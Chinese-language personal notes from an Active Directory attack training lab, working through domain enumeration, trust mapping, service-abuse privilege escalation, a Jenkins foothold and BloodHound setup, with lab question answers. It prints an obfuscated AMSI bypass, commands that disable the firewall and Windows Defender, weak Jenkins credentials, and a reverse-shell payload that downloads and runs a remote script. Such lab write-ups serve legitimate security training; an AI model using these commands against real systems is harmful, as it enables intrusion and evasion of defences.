# 客户端远程连接
下载工具：
https://mremoteng.org/download


# 绕过AMSI
```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

# 绕过powershell执行策略
```
powershell -ep bypass
```

# Learning Objective - 1

## 我是谁
```

PS C:\AD> whoami /all

USER INFORMATION
----------------

User Name        SID
================ ==============================================
dcorp\student366 S-1-5-21-1874506631-3219952063-538504511-45144


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
dcorp\RDPUsers                             Group            S-1-5-21-1874506631-3219952063-538504511-1116 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

## 当前域
```
PS C:\AD> get-netdomain


Forest                  : moneycorp.local
DomainControllers       : {dcorp-dc.dollarcorp.moneyco
Children                : {us.dollarcorp.moneycorp.loc
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : moneycorp.local
PdcRoleOwner            : dcorp-dc.dollarcorp.moneycor
RidRoleOwner            : dcorp-dc.dollarcorp.moneycor
InfrastructureRoleOwner : dcorp-dc.dollarcorp.moneycor
Name                    : dollarcorp.moneycorp.local
```

## 当前域组信息
```
PS C:\AD> Get-NetGroup
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
IIS_IUSRS
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
System Managed Accounts Group
Storage Replica Administrators
Domain Computers
Domain Controllers
Cert Publishers
Domain Admins
Domain Users
Domain Guests
Group Policy Creator Owners
RAS and IAS Servers
Server Operators
Account Operators
Pre-Windows 2000 Compatible Access
Windows Authorization Access Group
Terminal Server License Servers
Allowed RODC Password Replication Group
Denied RODC Password Replication Group
Read-only Domain Controllers
Cloneable Domain Controllers
Protected Users
Key Admins
DnsAdmins
DnsUpdateProxy
RDPUsers
```


## 域中所有用户
```
PS C:\AD> get-netuser |select cn
--
Administrator
Guest
DefaultAccount
krbtgt
ci admin
sql admin
web svc
srv admin
app admin
mgmt admin
svc admin
studentadmin
sql1 admin
test da
Control359User
Control360User
Control361User
Control362User
Control363User
Control364User
Control365User
Control366User
Control367User
Control368User
Control369User
Control370User
Support359User
Support360User
Support361User
Support362User
Support363User
Support364User
Support365User
Support366User
Support367User
Support368User
Support369User
Support370User
VPN359User
VPN360User
VPN361User
VPN362User
VPN363User
VPN364User
VPN365User
VPN366User
VPN367User
VPN368User
VPN369User
VPN370User
student359
student360
student361
student362
student363
student364
student365
student366
student367
student368
student369
student370
Spiderman
```

## 当前域中计算机列表
```
PS C:\AD> Get-NetComputer
dcorp-dc.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-sql1.dollarcorp.moneycorp.local
dcorp-stdadm.dollarcorp.moneycorp.local
dcorp-std359.dollarcorp.moneycorp.local
dcorp-std360.dollarcorp.moneycorp.local
dcorp-std361.dollarcorp.moneycorp.local
dcorp-std362.dollarcorp.moneycorp.local
dcorp-std363.dollarcorp.moneycorp.local
dcorp-std364.dollarcorp.moneycorp.local
dcorp-std365.dollarcorp.moneycorp.local
dcorp-std366.dollarcorp.moneycorp.local
dcorp-std367.dollarcorp.moneycorp.local
dcorp-std368.dollarcorp.moneycorp.local
dcorp-std369.dollarcorp.moneycorp.local
dcorp-std370.dollarcorp.moneycorp.local
```

## 获取域管理员组所有成员
```
PS C:\AD> Get-NetGroupMember -GroupName "Domain Admins" -Recurse

GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : svcadmin
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-1122
IsGroup      : False
MemberDN     : CN=svc admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local

GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : Administrator
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-500
IsGroup      : False
MemberDN     : CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local

```

域管理员：svcadmin，Administrator


因为这不是根域，所以下面命令无显示
```Get-NetGroupMember -GroupName "Enterprise Admins"```

需要加上根域的名称：moneycorp.local
```
PS C:\AD> Get-NetGroupMember -GroupName "Enterprise Admins" -Domain moneycorp.local


GroupDomain  : moneycorp.local
GroupName    : Enterprise Admins
MemberDomain : moneycorp.local
MemberName   : Administrator
MemberSID    : S-1-5-21-280534878-1496970234-700767426-500
IsGroup      : False
MemberDN     : CN=Administrator,CN=Users,DC=moneycorp,DC=local
```

问题：SID of the member of the Enterprise Admins group
答案：S-1-5-21-280534878-1496970234-700767426-500

# Learning Objective - 2

## 获取所有OU
```
 Get-NetOU -FullData
```

## 获取所有GPO
```
Get-NetGPO -FullData
```


## 获取OUName是StudentMachines的全部信息
```
PS C:\AD> Get-NetOU -OUName StudentMachines -FullData

usncreated            : 65752
name                  : StudentMachines
gplink                : [LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
whenchanged           : 2/19/2019 7:04:25 AM
objectclass           : {top, organizationalUnit}
usnchanged            : 65837
dscorepropagationdata : {5/3/2020 9:04:05 AM, 5/3/2020 9:04:05 AM, 5/3/2020 9:04:05 AM, 2/21/2019 3:13:33 PM...}
adspath               : LDAP://OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local
distinguishedname     : OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local
ou                    : StudentMachines
whencreated           : 2/19/2019 7:01:04 AM
instancetype          : 4
objectguid            : 284a1630-3d96-45c6-99a0-1f8d138f29d5
objectcategory        : CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=moneycorp,DC=local

```

可以看到gplink里的GOPName是：{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}


## 获取指派给这个GPOname的OU
```
PS C:\AD> Get-NetGPO -GPOname "{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}"


usncreated               : 65831
displayname              : Students
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 4/20/2019 6:22:16 AM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 123144
dscorepropagationdata    : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
name                     : {3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
adspath                  : LDAP://CN={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
flags                    : 0
cn                       : {3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
distinguishedname        : CN={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 2/19/2019 7:04:25 AM
versionnumber            : 8
instancetype             : 4
objectguid               : 8ecdfe44-b617-4b9e-a9f9-4d548e5dc7b1
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local

```

问题：Display name of the GPO applied on StudentMachines OU
答案：Students

# Learning Objective - 3

## Task

> ● Enumerate following for the dollarcorp domain:
> − ACL for the Users group
> − ACL for the Domain Admins group
> − All modify rights/permissions for the studentx


查找Users组的所有ACL

```
PS C:\AD> Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs -Verbose
VERBOSE: Get-DomainSearcher search string: LDAP://DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: Get-DomainSearcher search string: LDAP://CN=Schema,CN=Configuration,DC=moneycorp,DC=local
VERBOSE: Get-DomainSearcher search string: LDAP://CN=Extended-Rights,CN=Configuration,DC=moneycorp,DC=local


InheritedObjectType   : All
ObjectDN              : CN=Users,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : NT AUTHORITY\SELF
IsInherited           : False
ActiveDirectoryRights : GenericRead
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-32-545

InheritedObjectType   : All
ObjectDN              : CN=Users,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : NT AUTHORITY\Authenticated Users
IsInherited           : False
ActiveDirectoryRights : GenericRead
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-32-545

...
...
```

同样的命令，查找Domain Admins组的所有ACL
```
PS C:\AD> Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs -Verbose
VERBOSE: Get-DomainSearcher search string: LDAP://DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: Get-DomainSearcher search string: LDAP://CN=Schema,CN=Configuration,DC=moneycorp,DC=local
VERBOSE: Get-DomainSearcher search string: LDAP://CN=Extended-Rights,CN=Configuration,DC=moneycorp,DC=local


InheritedObjectType   : All
ObjectDN              : CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : NT AUTHORITY\Authenticated Users
IsInherited           : False
ActiveDirectoryRights : GenericRead
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511-512

InheritedObjectType   : All
ObjectDN              : CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : NT AUTHORITY\SYSTEM
IsInherited           : False
ActiveDirectoryRights : GenericAll
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511-512

...
...
```

查找本账户（sudent366）的所有modify rights/permissions
```
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "sudent366"}
```

没有任何返回

同样的命令，查询RDPUsers组的权限
```
PS C:\AD> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}


InheritedObjectType   : All
ObjectDN              : CN=Control359User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : dcorp\RDPUsers
IsInherited           : False
ActiveDirectoryRights : GenericAll
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511-45101
IdentitySID           : S-1-5-21-1874506631-3219952063-538504511-1116

InheritedObjectType   : All
ObjectDN              : CN=Control360User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : dcorp\RDPUsers
IsInherited           : False
ActiveDirectoryRights : GenericAll
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511-45102
IdentitySID           : S-1-5-21-1874506631-3219952063-538504511-1116
```


问题：ActiveDirectory Rights for RDPUsers group on the users named ControlxUser
答案：GenericAll

# Learning Objective - 4

## Task
> • Enumerate all domains in the moneycorp.local forest.
> • Map the trusts of the dollarcorp.moneycorp.local domain.
> • Map External trusts in moneycorp.local forest.
> • Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?


枚举moneycorp.local林中的所有域
```
PS C:\AD> Get-NetForestDomain -Forest moneycorp.local


Forest                  : moneycorp.local
DomainControllers       : {dcorp-dc.dollarcorp.moneycorp.local}
Children                : {us.dollarcorp.moneycorp.local}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : moneycorp.local
PdcRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
RidRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
InfrastructureRoleOwner : dcorp-dc.dollarcorp.moneycorp.local
Name                    : dollarcorp.moneycorp.local

Forest                  : moneycorp.local
DomainControllers       : {mcorp-dc.moneycorp.local}
Children                : {dollarcorp.moneycorp.local}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : mcorp-dc.moneycorp.local
RidRoleOwner            : mcorp-dc.moneycorp.local
InfrastructureRoleOwner : mcorp-dc.moneycorp.local
Name                    : moneycorp.local

Forest                  :
DomainControllers       :
Children                :
DomainMode              :
DomainModeLevel         :
Parent                  :
PdcRoleOwner            :
RidRoleOwner            :
InfrastructureRoleOwner :
Name                    : us.dollarcorp.moneycorp.local

```

枚举moneycorp.local林中的所有信任关系
```
PS C:\AD> Get-NetForestDomain -Verbose | Get-NetDomainTrust

SourceName                 TargetName                      TrustType TrustDirection
----------                 ----------                      --------- --------------
dollarcorp.moneycorp.local moneycorp.local               ParentChild  Bidirectional
dollarcorp.moneycorp.local us.dollarcorp.moneycorp.local ParentChild  Bidirectional
dollarcorp.moneycorp.local eurocorp.local                   External  Bidirectional
moneycorp.local            dollarcorp.moneycorp.local    ParentChild  Bidirectional
```


枚举dollarcorp.moneycorp.local域中的所有信任关系
```
PS C:\AD> Get-NetDomainTrust -Domain dollarcorp.moneycorp.local

SourceName                 TargetName                      TrustType TrustDirection
----------                 ----------                      --------- --------------
dollarcorp.moneycorp.local moneycorp.local               ParentChild  Bidirectional
dollarcorp.moneycorp.local us.dollarcorp.moneycorp.local ParentChild  Bidirectional
dollarcorp.moneycorp.local eurocorp.local                   External  Bidirectional
```



枚举moneycorp.local林中所有的External trusts（外部信任）

```
PS C:\AD> Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq "External"}

SourceName                 TargetName     TrustType TrustDirection
----------                 ----------     --------- --------------
dollarcorp.moneycorp.local eurocorp.local  External  Bidirectional
```

枚举eurocorp.local林中的所有信任关系
```
PS C:\AD> Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust

SourceName     TargetName                   TrustType TrustDirection
----------     ----------                   --------- --------------
eurocorp.local eu.eurocorp.local          ParentChild  Bidirectional
eurocorp.local dollarcorp.moneycorp.local    External  Bidirectional

```

问题：Trust Direction for the trust between dollarcorp.moneycorp.local and eurocorp.local
答案：Bidirectional（双向信任）


# Learning Objective - 5

## Task

> ● Exploit a service on dcorp-studentx and elevate privileges to local administrator.
> ● Identify a machine in the domain where studentx has local administrative access.
> ● Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.

### 提权到local administrator
使用beRoot.exe可以清楚看到AbyssWebServer有重启的权限，并且AbyssWebServer路径没有引号，可以利用提权
```
PS C:\AD> .\beRoot.exe
|====================================================================|
|                                                                    |
|                    Windows Privilege Escalation                    |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|



################ Service ################

[!] Permission to create a service with openscmanager
True

[!] Check services that could its configuration could be modified
Permissions: change config: True / start: True / stop: True
Name: AbyssWebServer
Display Name: Abyss Web Server

Permissions: change config: True / start: True / stop: True
Name: SNMPTRAP
Display Name: SNMP Trap


[!] Path containing spaces without quotes
permissions: {'change_config': True, 'start': True, 'stop': True}
Key: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AbyssWebServer
Full path: C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
Name: AbyssWebServer
Writables path found:
        - C:\WebServer
```


使用privesc.ps1枚举，发现了两组疑似管理员的凭据，同样枚举到AbyssWebServer可以进行“未加引号的服务路径”提权。不过传文件过去的时候exe文件会被杀软杀掉
```
PS C:\AD> . .\privesc.ps1
PS C:\AD> Invoke-Privesc
Date of last applied patch - just use public exploits if not patched:
8/17/2020

----------------------------------------------------------------------

Files that may contain Administrator password - you know what to do with this one:
C:\Windows\panther\setupinfo
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

----------------------------------------------------------------------

Services with space in path and not enclosed with quotes - if you have permissions run executable from different directory - exploit/windows/local/trusted_service_path:
C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service

----------------------------------------------------------------------

PATH variable entries permissions - place binary or DLL to execute before legitimate
Group: student366, Permissions: FullControl on C:\Python27\
Group: Users, Permissions: AppendData on C:\Program Files\Java\jdk-11.0.2\bin
Group: Users, Permissions: CreateFiles on C:\Program Files\Java\jdk-11.0.2\bin

----------------------------------------------------------------------

System32 directory permissions - backdoor windows binaries:
Permissions set on System32 directory are correct for all groups.

----------------------------------------------------------------------

System32 files and directories permissions - backdoor windows binaries:
Group: Users, Permissions: CreateFiles, ReadAndExecute, Synchronize on C:\Windows\system32\spool\drivers\color

----------------------------------------------------------------------
```


## PowerUp.ps1

枚举所有“未加引号的服务路径”
```
PS C:\AD> . .\PowerUp.ps1
PS C:\AD> Get-ServiceUnquoted


ServiceName    : AbyssWebServer
Path           : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
CanRestart     : True

ServiceName    : AbyssWebServer
Path           : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
```

```
PS C:\WebServer> whoami
dcorp\student366
PS C:\WebServer> Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student366'

ServiceAbused  Command
-------------  -------
AbyssWebServer net localgroup Administrators dcorp\student366 /add

```

枚举所有可以修改服务二进制文件的服务文件（ services where the current can make changes to service binary）
```

PS C:\AD> Get-ModifiableServiceFile -Verbose
VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer


ServiceName                     : AbyssWebServer
Path                            : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
ModifiableFile                  : C:\WebServer\Abyss Web Server\WebServer
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'
CanRestart                      : True

VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer
ServiceName                     : AbyssWebServer
Path                            : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
ModifiableFile                  : C:\WebServer\Abyss Web Server\WebServer
ModifiableFilePermissions       : WriteData/AddFile
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'
CanRestart                      : True

```

enumerate services with weak service permissions.
```
 PS C:\AD> Get-ModifiableService -Verbose
VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer
VERBOSE: Current user has 'ChangeConfig' for AbyssWebServer
VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer


ServiceName   : AbyssWebServer
Path          : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'AbyssWebServer'
CanRestart    : True

```




根据Get-ModifiableService枚举的结果，使用Invoke-ServiceAbuse，把当前账号添加到本地管理员组
```
PS C:\AD>
PS C:\AD> Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student366'

ServiceAbused  Command
-------------  -------
AbyssWebServer net localgroup Administrators dcorp\student366 /add
```


查找本地管理员可以用powershell远程登录的电脑
```
PS C:\AD> . .\Find-PSRemotingLocalAdminAccess.ps1
PS C:\AD> Find-PSRemotingLocalAdminAccess
dcorp-adminsrv
dcorp-std366
```
可以看到可以远程登录两台电脑，一台是本机，一台是dcorp-adminsrv



现在我们可以用Enter-PSSession横向移动到另一台电脑dcorp-adminsrv（计算机全称=dcorp-adminsrv.dollarcorp.moneycorp.local，见上面当前域的计算机列表的枚举）

```
PS C:\AD> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 3:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::34d5:8394:57f3:7610%3
   IPv4 Address. . . . . . . . . . . : 172.16.100.66
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.100.254

Tunnel adapter isatap.{6B6E4BEE-3BB9-4E5E-8522-6AC909EEF3D6}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :

PS C:\AD> Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local

[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> whoami
dcorp\student366

[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::4de0:a61b:db3f:172c%2
   IPv4 Address. . . . . . . . . . . : 172.16.4.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.4.254

Tunnel adapter isatap.{5A335808-BE49-450F-AFA2-F08ED9EF5EEF}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```



jenkin!这个web app在未登陆的情况下，可以通过下面页面查看有什么账号
```http://172.16.3.11:8080/asynchPeople//```

可以看到有builduser，jenkinsadmin，	manager三个账号

手动测试发现

Jenkins 登录账号信息是：
```builduser:builduser```



Jenkins特权提升，可以通过两种方法
1. 第一种是访问```http://172.16.3.11:8080/script```页面，如果当前账号拥有权限，将会被允许使用一个在线的console
2. 第二种是通过执行任务（例子页面：```http://172.16.3.11:8080/job/project0/```）,编译一段powershell反弹回来一个shell提权

powercat监听
```
PS C:\AD> . .\powercat.ps1
PS C:\AD> powercat -l -v -p 443 -t 100
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
```
因为本机装了python2，用python搭一个简单的http server

```
python -m SimpleHTTPServer 80
```

在Jenkins里我用下面payload一直反弹不了shell

```powershell.exe iex (iwr http://172.16.100.66/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.66 -Port 443```

提示无法从我本机下载脚本，不知道是不是网络问题

但是可以执行其他命令得知Jenkins是由哪个用户运行的，使用```whoami /all```

问题：Service abused on the student VM for local privilege escalation
答案：AbyssWebServer

问题：Script used for hunting for admin privileges using PowerShell Remoting
答案：Find-PSRemotingLocalAdminAccess.ps1


问题：Jenkins user used to access Jenkins web console
答案：builduser

问题：Domain user used for running Jenkins service on dcorp-ci
答案：ciadmin


### 关闭防火墙和windows defend

后来问了助教，原来是本地防火墙没有关闭，导致反弹不了shell
1. 关闭防火墙：
```NetSh Advfirewall set allprofiles state off```

上面命令需要管理员权限，因为我们已经在本地提权到了管理员组，只需要以run as administrator开启一个cmd命令行，然后输入当前域账号登录信息，即可以管理员身份开启cmd，执行上面命令

查看防火墙状态：
```
PS C:\Windows\system32> netsh advfirewall show currentprofile

Domain Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Ok.
```

2. 关闭windows defend

获取windefand状态
```
PS C:\ad> Get-Service WinDefend

Status   Name               DisplayName
------   ----               -----------
Running  WinDefend          Windows Defender Service
```

以管理员身份运行下面powershll命令：
```reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpywar" /d 1 /t REG_DWORD```

再在教学面板reboot student VM (lab下不可以在VM里直接重启)

重新登录以后，再次查看windefand状态
```
PS C:\Windows\system32> Get-Service WinDefend

Status   Name               DisplayName
------   ----               -----------
Stopped  WinDefend          Windows Defender ServicePS C:\Windows\system32> Get-Service WinDefend

Status   Name               DisplayName
------   ----               -----------
Stopped  WinDefend          Windows Defender Service
```

已成功关闭windows defend


然后我把nc.exe传到靶机，用nc成功接收到反弹shell。我怀疑是powercat本身的问题。不过传nc之前一定要关闭WinDefend，不然有可能会被当成病毒被WinDefend杀掉。
```
PS C:\ad> .\nc.exe -lnvp 443
listening on [any] 443 ...
connect to [172.16.100.66] from (UNKNOWN) [172.16.3.11] 50406
Windows PowerShell running as user ciadmin on DCORP-CI
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project1>whoami
dcorp\ciadmin
PS C:\Program Files (x86)\Jenkins\workspace\project1> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::e599:a231:d264:7200%2
   IPv4 Address. . . . . . . . . . . : 172.16.3.11
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.3.254

Tunnel adapter isatap.{5BF9E7FE-BDCB-487C-B818-7332CA8AFB16}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```


## 再再再补充
跟助教继续沟通。不是powercat的问题，其实是已经收到了反弹的shell，只不过需要按多几下Enter键才能显示出反弹shell的内容，我尼玛。。。


# Learning Objective - 6

Task
> • Setup BloodHound and identify a machine where studentx has local administrative access.



1. 收集信息
工具：BloodHound-master

引入： 
```
. .\SharpHound.ps1
```

收集全部域信息
```
Invoke-BloodHound -CollectionMethod All -verbose
```


```
PS C:\ad\BloodHound-master\Ingestors> ls


    Directory: C:\ad\BloodHound-master\Ingestors


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/12/2022   7:44 PM                DebugBuilds
-a----        2/12/2022   7:49 PM          14519 20220212194952_BloodHound.zip
-a----        2/12/2022   7:49 PM          29184 MjdjZDRjMmMtZWVhZC00YmE4LThkYmItZWQ4NWVmMjllN2Mx.bin
------        7/22/2020  11:12 AM         833536 SharpHound.exe
------        7/22/2020  11:12 AM         973425 SharpHound.ps1


```


2. 开启neo4j
工具：neo4j-community-4.1.1

去到```C:\AD\neo4j-community-4.1.1\bin```（需要管理员权限，上面通过service abuse已经把当前账号加入到本地管理员组，因此输入当前账号应该可以成功启动，需要注意账号必须是域账号，比如：dcorp\student366）执行
```
.\neo4j.bat install-service
```
再执行：
```
.\neo4j.bat start
```

3. 开启BloodHound
工具： BloodHound-win32-x64

双击BloodHound.exe

第一次登录的账号密码，neo4j:neo4j （会要求更改密码）

去到:http://localhost:7474 修改密码

用修改完成的密码登录bloodhound


展开bloodhound，可以发现所有student用户对```dcorp-adminsrv.dollarcorp.moneycorp.local```这台计算机拥有admin accesss权限


